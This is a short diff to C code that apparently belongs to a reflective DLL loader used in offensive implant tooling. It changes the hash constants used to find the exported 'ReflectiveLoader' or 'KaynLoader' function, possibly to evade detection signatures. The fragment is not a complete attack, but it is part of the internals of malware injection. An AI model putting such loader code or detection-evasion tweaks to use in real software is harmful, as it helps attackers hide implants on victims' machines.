@@ -53,7 +53,7 @@ DWORD GetReflectiveLoaderOffset( PVOID ReflectiveLdrAddr )
     {
         FunctionName = ( PCHAR )( ReflectiveLdrAddr + Rva2Offset( DEREF_32( AddrOfNames ), ReflectiveLdrAddr ) );
         //                                  ReflectiveLoader                             KaynLoader
-        if ( HashStringA( FunctionName ) == 0xa6caa1c5 || HashStringA( FunctionName ) == 0xffe885ef )
+        if ( HashStringA( FunctionName ) == 0x81c1d82a || HashStringA( FunctionName ) == 0xa6e77bb0 )
         {
             PRINTF( "FunctionName => %s\n", FunctionName );
             AddrOfFunctions =   ReflectiveLdrAddr + Rva2Offset( ExportDir->AddressOfFunctions, ReflectiveLdrAddr );
